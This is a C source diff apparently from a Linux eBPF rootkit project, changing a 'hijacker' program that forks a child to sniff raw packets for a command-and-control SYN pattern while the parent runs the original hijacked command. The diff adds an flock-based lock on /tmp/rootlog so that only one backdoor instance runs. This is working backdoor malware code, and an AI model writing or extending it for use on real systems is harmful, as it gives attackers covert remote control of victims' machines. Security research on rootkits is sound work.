@@ -15,12 +15,16 @@
 #include <netdb.h>
 #include <netinet/ip.h>
 #include <netinet/tcp.h>
+#include <sys/file.h>
+#include <errno.h>
 
 #include "lib/RawTCP.h"
 #include "../common/c&c.h"
 #include <linux/bpf.h>
 #include <bpf/bpf.h>
 #include <bpf/libbpf.h>
+
+#define LOCK_FILE "/tmp/rootlog"
 
 char* getLocalIpAddress(){
     char hostbuffer[256];
@@ -65,13 +69,8 @@ char* execute_command(char* command){
     return res;
 }
 
-int hijacker_process_routine(int argc, char* argv[]){
-    int fd = open("/tmp/rootlog", O_RDWR | O_CREAT | O_TRUNC, 0666);
-    if(fd<0){
-        perror("Failed to open log file");
-        //return -1;
-    }
-
+int hijacker_process_routine(int argc, char* argv[], int fd){
+    //Lock the file to indicate we are already into the routine
     time_t rawtime;
     struct tm * timeinfo;
 
@@ -98,7 +97,7 @@ int hijacker_process_routine(int argc, char* argv[]){
     write(fd, "\n", 1);
     write(fd, "Sniffing...\n", 13);
     
-
+    printf("Running hijacking process\n");
     packet_t packet = rawsocket_sniff_pattern(CC_PROT_SYN);
     if(packet.ipheader == NULL){
         write(fd, "Failed to open rawsocket\n", 1);
@@ -149,6 +148,7 @@ int hijacker_process_routine(int argc, char* argv[]){
         }
     }
 
+    flock(fd, LOCK_UN);
     close(fd);
     return 0;
 }
@@ -177,6 +177,7 @@ int main(int argc, char* argv[], char *envp[]){
             perror("Failed to execve()");
             exit(-1);
         }
+        exit(0);
     }
 
 
@@ -190,8 +191,23 @@ int main(int argc, char* argv[], char *envp[]){
     if (pid == 0) {
         //Child process
         printf("I am the child with pid %d\n", (int) getpid());
+
+        //First of all check if the locking log file is locked, which indicates that the backdoor process is already running
+        int fd = open(LOCK_FILE, O_RDWR | O_CREAT | O_TRUNC, 0666);
+        if(fd<0){
+            perror("Failed to open lock file before entering hijacking routine");
+            exit(-1);
+        }
+        if (flock(fd, LOCK_EX|LOCK_NB) == -1) {
+            if (errno == EWOULDBLOCK) {
+                perror("lock file was locked");
+            } else {
+                perror("Error with the lockfile");
+            }
+            exit(-1);
+        }
+        hijacker_process_routine(argc, argv, fd);
         printf("Child process is exiting\n");
-        hijacker_process_routine(argc, argv);
         exit(0);
     }
     //Parent process. Call original hijacked command
